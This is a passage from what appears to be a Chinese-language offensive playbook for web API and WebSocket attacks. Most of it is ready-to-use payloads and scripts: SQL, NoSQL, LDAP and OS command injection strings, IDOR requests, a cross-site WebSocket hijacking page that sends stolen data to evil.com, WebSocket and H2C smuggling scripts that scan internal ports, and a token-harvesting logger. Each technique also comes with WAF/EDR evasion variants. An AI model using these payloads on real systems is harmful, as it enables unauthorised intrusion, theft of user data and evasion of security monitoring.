  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/documents/$doc_id"
done

# 访问其他用户私有数据
GET /api/users/2/profile
GET /api/users/2/settings
GET /api/users/2/credit-cards
```

**4. 4. 修改/删除操作**
_修改/删除操作测试_
```
# 修改其他用户数据
PUT /api/documents/doc_123
Authorization: Bearer user_b_token
{"title": "Modified by B"}

# 删除其他用户数据
DELETE /api/documents/doc_123
Authorization: Bearer user_b_token

# 添加到其他团队
POST /api/teams/team_1/members
Authorization: Bearer attacker_token
{"user_id": "attacker_id"}
```

**WAF/EDR 绕过变体：**

**1. 路径遍历**
_路径遍历绕过_
```
# 路径遍历访问
GET /api/users/../admin
GET /api/users/..%2Fadmin

# 编码绕过
GET /api/users/%2e%2e/admin
GET /api/users/..%c0%afadmin
```

**2. 参数篡改**
_参数篡改绕过_
```
# 修改请求方法
# GET变POST
POST /api/documents/doc_123

# 添加参数
GET /api/documents/doc_123?user_id=attacker

# 修改Content-Type
Content-Type: application/xml
<document><id>doc_123</id></document>
```

---

### API注入攻击  `api-injection`
API端点中的各类注入攻击
子类：**API注入** · tags: `api` `injection` `sqli` `nosqli`

**前置条件：** API接受用户输入；输入未正确过滤

**攻击链：**

**1. 1. SQL注入**
_API SQL注入_
```
# REST API SQL注入
GET /api/users?id=1 OR 1=1
GET /api/users?name=admin'--
GET /api/users?sort=name; SELECT SLEEP(5)--

# POST请求注入
POST /api/users
{"name": "admin' OR '1'='1"}

# JSON注入
POST /api/search
{"query": "test' UNION SELECT username,password FROM users--"}
```

**2. 2. NoSQL注入**
_NoSQL注入_
```
# MongoDB注入
GET /api/users?name[$ne]=
GET /api/users?age[$gt]=0
GET /api/users?role[$ne]=user

# POST请求
POST /api/login
{"username": "admin", "password": {"$ne": ""}}

{"username": "admin", "password": {"$regex": ".*"}}

# 嵌套查询
{"$where": "this.password == this.password"}
{"$where": "return true"}
```

**3. 3. LDAP注入**
_LDAP注入_
```
# LDAP注入
GET /api/users?name=*)(uid=*))(|(uid=*
GET /api/login?user=*&password=*

# 认证绕过
POST /api/auth
{"user": "admin)(|(password=*))", "password": "x"}

# 信息泄露
GET /api/search?name=*)(objectClass=*)
```

**4. 4. 命令注入**
_命令注入_
```
# OS命令注入
GET /api/ping?host=127.0.0.1;id
GET /api/convert?file=test.pdf;cat /etc/passwd

# POST请求
POST /api/exec
{"cmd": "ls -la; cat /etc/passwd"}

# 反引号注入
GET /api/check?host=`id`
GET /api/check?host=$(id)
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_编码绕过_
```
# URL编码
GET /api/users?id=1%20OR%201%3D1

# Unicode编码
GET /api/users?id=1%u0020OR%u00201%3D1

# 双重编码
GET /api/users?id=1%2520OR%25201%253D1
```

**2. Content-Type绕过**
_Content-Type绕过_
```
# 切换Content-Type
Content-Type: application/xml
<user><id>1 OR 1=1</id></user>

Content-Type: application/x-www-form-urlencoded
id=1+OR+1=1

# JSON数组
{"id": ["1", "OR", "1=1"]}
```

---

### · WebSocket安全

### WebSocket跨站劫持(CSWSH)  `ws-hijack`
利用WebSocket握手阶段缺少Origin验证的漏洞，通过恶意网页建立跨站WebSocket连接。攻击者可劫持受害者的WebSocket会话，窃取实时数据或以受害者身份发送消息。类似于CSRF但针对WebSocket协议。
子类：**WebSocket劫持** · tags: `WebSocket` `CSWSH` `Origin` `跨站` `会话劫持`

**前置条件：** 目标使用WebSocket通信；WebSocket握手未验证Origin

**攻击链：**

**1. 1. 识别WebSocket端点**
_搜索WebSocket端点并测试是否接受任意Origin的跨站连接_
```
# 从前端代码搜索WebSocket连接
curl -s "https://{TARGET}/static/js/main.js" | grep -oP "wss?://[^\x27\x22\s]+"

# 浏览器开发者工具检查(Console)
# 在Network标签筛选WS类型请求

# 手动连接测试
websocat "wss://{TARGET}/ws" -H "Origin: https://evil.com" --no-close

# 检查握手响应中的Origin处理
curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
  -H "Origin: https://evil.com" \
  "https://{TARGET}/ws"
```

**2. 2. 构造跨站劫持POC页面**
_创建恶意HTML页面利用受害者Cookie建立WebSocket连接并窃取数据_
```
<!-- CSWSH攻击页面 -->
<html>
<body>
<h1>WebSocket Cross-Site Hijacking POC</h1>
<div id="output"></div>
<script>
  // 目标WebSocket——浏览器会自动带上Cookie
  var ws = new WebSocket("wss://{TARGET}/ws");
  
  ws.onopen = function() {
    document.getElementById("output").innerHTML += "<p>Connected!</p>";
    // 以受害者身份发送消息
    ws.send(JSON.stringify({action: "get_profile"}));
    ws.send(JSON.stringify({action: "list_messages"}));
  };
  
  ws.onmessage = function(evt) {
    // 窃取WebSocket返回的数据
    document.getElementById("output").innerHTML += "<pre>" + evt.data + "</pre>";
    // 外带到攻击者服务器
    fetch("https://evil.com/collect", {
      method: "POST",
      body: evt.data
    });
  };
</script>
</body>
</html>
```

**3. 3. WebSocket消息注入**
_通过WebSocket消息注入SQL/XSS/命令注入payload_
```
# 如果WebSocket消息被拼入后端查询
# SQL注入
ws.send(JSON.stringify({
  action: "search",
  query: "test\x27 UNION SELECT username,password FROM users--"
}));

# XSS(如果消息被渲染到其他用户页面)
ws.send(JSON.stringify({
  action: "chat",
  message: "<img src=x onerror=alert(document.cookie)>"
}));

# 命令注入
ws.send(JSON.stringify({
  action: "exec",
  target: "127.0.0.1;id"
}));
```

**4. 4. WebSocket流量分析脚本**
_Python脚本实时监控WebSocket流量并记录敏感数据_
```
# Python WebSocket监听和分析脚本
import asyncio
import websockets
import json

async def monitor():
    uri = "wss://{TARGET}/ws"
    headers = {"Cookie": "{SESSION_COOKIE}"}
    
    async with websockets.connect(uri, extra_headers=headers) as ws:
        # 发送认证消息
        await ws.send(json.dumps({"type": "auth", "token": "{TOKEN}"}))
        
        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            print(f"[{data.get('type', 'unknown')}] {msg}")
            
            # 记录敏感数据
            if 'password' in msg.lower() or 'token' in msg.lower():
                with open('ws_sensitive.log', 'a') as f:
                    f.write(msg + '\n')

asyncio.run(monitor())
```

**WAF/EDR 绕过变体：**

**1. 绕过Origin验证**
_通过Origin伪造、子域名、null Origin和子协议绕过WebSocket Origin验证_
```
# Origin头伪造(仅在非浏览器环境有效)
websocat "wss://{TARGET}/ws" -H "Origin: https://{TARGET}"

# 子域名绕过
Origin: https://test.{TARGET}  # 如果验证不严格
Origin: https://{TARGET}.evil.com  # 域名后缀混淆

# null Origin(某些浏览器场景)
# 使用data: URI或沙箱iframe
<iframe sandbox="allow-scripts" src="data:text/html,<script>new WebSocket('wss://{TARGET}/ws')</script>">

# 使用WebSocket子协议绕过
Sec-WebSocket-Protocol: graphql-ws, chat
```

---

### WebSocket走私攻击  `ws-smuggling`
利用反向代理/负载均衡器对WebSocket协议处理的差异，通过WebSocket升级请求走私HTTP请求到内网服务。攻击者可绕过前端安全控制直接与后端通信，访问受保护的内部API或管理接口。
子类：**WebSocket走私** · tags: `WebSocket` `走私` `反向代理` `H2C` `内网穿透`

**前置条件：** 目标使用反向代理(Nginx/Varnish等)；代理允许WebSocket升级；后端存在内部服务

**攻击链：**

**1. 1. 检测WebSocket走私可能性**
_通过Upgrade请求测试反向代理是否存在WebSocket/H2C走私漏洞_
```
# 测试Upgrade响应
curl -i -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" \
  "https://{TARGET}/"

# 测试H2C走私(HTTP/2 Cleartext)
curl -i -H "Connection: Upgrade, HTTP2-Settings" \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA" \
  "https://{TARGET}/"

# 检测代理类型
curl -I "https://{TARGET}/" | grep -iE "server:|via:|x-powered-by:"
```

**2. 2. WebSocket隧道构造**
_WebSocket升级后通过原始Socket发送走私的HTTP请求访问内部接口_
```
# 使用Python构造WebSocket走私
import socket, ssl, base64

def ws_smuggle(target_host, target_port, internal_path):
    # WebSocket握手
    key = base64.b64encode(b"test1234test1234").decode()
    upgrade = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"\r\n"
    )
    
    ctx = ssl.create_default_context()
    sock = ctx.wrap_socket(socket.socket(), server_hostname=target_host)
    sock.connect((target_host, target_port))
    sock.send(upgrade.encode())
    
    resp = sock.recv(4096).decode()
    print(f"Upgrade response: {resp[:100]}")
    
    if "101" in resp:
        # 走私HTTP请求到内网
        smuggled = (
            f"GET {internal_path} HTTP/1.1\r\n"
            f"Host: 127.0.0.1\r\n"
            f"\r\n"
        )
        sock.send(smuggled.encode())
        print(sock.recv(4096).decode())

ws_smuggle("{TARGET}", 443, "/admin/")
```

**3. 3. H2C走私绕过访问控制**
_使用h2cSmuggler工具通过HTTP/2升级走私访问内网服务和管理接口_
```
# h2cSmuggler工具
python3 h2cSmuggler.py -x "https://{TARGET}" \
  "http://{TARGET}/admin/"

# 手动H2C走私——访问内部API
python3 h2cSmuggler.py -x "https://{TARGET}" \
  "http://127.0.0.1:8080/api/internal/users"

# 扫描内网端口
for port in 80 8080 8443 9090 3000 5000; do
  python3 h2cSmuggler.py -x "https://{TARGET}" \
    "http://127.0.0.1:$port/" 2>/dev/null && echo "Port $port: OPEN"
done
```

**4. 4. 反向代理差异利用**
_利用不同反向代理(Nginx/Varnish/HAProxy)的WebSocket处理差异进行走私_
```
# Nginx WebSocket走私
# 如果Nginx配置proxy_pass到后端
# 但未限制Upgrade请求

# 测试反向代理路径差异
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  "https://{TARGET}/..;/admin/"

# Varnish缓存投毒+WebSocket
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "X-Forwarded-Host: evil.com" \
  "https://{TARGET}/"

# HAProxy WebSocket走私
# 利用HAProxy在Upgrade后不再检查后续请求
curl -H "Connection: Upgrade" -H "Upgrade: websocket" \
  "https://{TARGET}/" --next -H "Host: internal" "https://{TARGET}/admin/"
```

**WAF/EDR 绕过变体：**

**1. 绕过WAF的WebSocket检测**
_通过大小写混淆、分块传输和压缩Extension绕过WAF对WebSocket走私的检测_
```
# 大小写混淆
Connection: upgrade
Upgrade: WebSocket  # 大小写变体
Upgrade: WEBSOCKET

# 分块传输隐藏走私内容
Transfer-Encoding: chunked
# 在WebSocket帧中嵌入HTTP请求

# 使用WebSocket Extension混淆
Sec-WebSocket-Extensions: permessage-deflate
# 压缩后的恶意消息难以被WAF检测

# 伪装为正常WebSocket流量
# 先发送正常消息，延迟后发送走私请求
```

---

### WebSocket认证与授权绕过  `ws-auth-bypass`
利用WebSocket连接建立后缺少持续认证检查的漏洞，通过会话固定、令牌重放、频道越权订阅等方式绕过认证和授权机制。WebSocket的长连接特性使得权限变更后原连接仍可保持访问。
子类：**认证绕过** · tags: `WebSocket` `认证` `授权` `越权` `Token重放`

**前置条件：** 目标使用WebSocket实时通信；已获取有效会话/Token

**攻击链：**

**1. 1. WebSocket认证机制分析**
_通过Monkey-patch WebSocket对象拦截和分析认证流程_
```
# 抓取WebSocket握手和初始消息
# 在浏览器Console中:
const origWS = WebSocket;
window.WebSocket = function(url, protocols) {
  console.log("[WS] Connecting to:", url);
  const ws = new origWS(url, protocols);
  const origSend = ws.send.bind(ws);
  ws.send = function(data) {
    console.log("[WS] SEND:", data);
    origSend(data);
  };
  ws.addEventListener("message", e => console.log("[WS] RECV:", e.data));
  return ws;
};

# 观察认证流程：
# 1. Cookie/Token在握手阶段传递？
# 2. 连接后发送auth消息？
# 3. 是否有心跳保活机制？
```

**2. 2. Token重放与会话固定**
_测试Token过期后的重放和WebSocket连接在注销后是否仍活跃_
```
# 测试Token过期后是否仍可使用
# Step 1: 记录有效Token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Step 2: 等待Token过期/注销账号
# Step 3: 尝试用旧Token建立WebSocket连接
websocat "wss://{TARGET}/ws" \
  -H "Authorization: Bearer $TOKEN" 2>&1 | head -5

# 测试WebSocket连接在用户注销后是否仍然活跃
# (WebSocket长连接可能不受HTTP会话注销影响)

# 会话固定——使用他人Token
websocat "wss://{TARGET}/ws" \
  -H "Cookie: session={OTHER_USER_SESSION}"
```

**3. 3. 频道/房间越权订阅**
_测试WebSocket频道/房间的授权控制，尝试越权订阅他人私有频道_
```
# 订阅其他用户的私有频道
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "user.1002.notifications"  // 尝试订阅其他用户
}));

# 订阅管理员频道
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "admin.dashboard"
}));

# 遍历频道ID
for (let i = 1; i <= 100; i++) {
  ws.send(JSON.stringify({
    action: "subscribe",
    channel: `user.${i}.messages`
  }));
}

# 测试频道名注入
ws.send(JSON.stringify({
  action: "subscribe",
  channel: "public.*"  // 通配符订阅
}));
```

**4. 4. WebSocket速率限制与DoS测试**
_测试WebSocket的消息速率限制和大小限制_
```
# 测试消息速率限制
import asyncio, websockets, json, time

async def rate_test():
    uri = "wss://{TARGET}/ws"
    async with websockets.connect(uri) as ws:
        # 快速发送消息测试速率限制
        start = time.time()
        for i in range(1000):
            await ws.send(json.dumps({"action": "ping", "seq": i}))
        elapsed = time.time() - start
        print(f"Sent 1000 messages in {elapsed:.2f}s")
        
        # 大消息测试
        large_msg = "A" * (1024 * 1024)  # 1MB
        try:
            await ws.send(large_msg)
            print("Large message accepted - no size limit!")
        except Exception as e:
            print(f"Large message rejected: {e}")

asyncio.run(rate_test())
```

**WAF/EDR 绕过变体：**

**1. 绕过WebSocket认证机制**
_利用协议降级、重连机制和轮询降级绕过WebSocket认证_
```
# 使用低权限Token获取高权限WebSocket连接
# 某些实现仅在握手时验证Token，连接后不再检查

# 利用WebSocket重连机制
# 某些客户端实现会在断线后自动重连
# 拦截重连请求替换Token

# 协议降级攻击
# 从wss://降级到ws://(如果后端支持)
websocat "ws://{TARGET}/ws" -H "Cookie: session={TOKEN}"

# 利用Socket.io/SockJS的HTTP降级
curl "https://{TARGET}/socket.io/?EIO=4&transport=polling&sid={SID}"
```

---
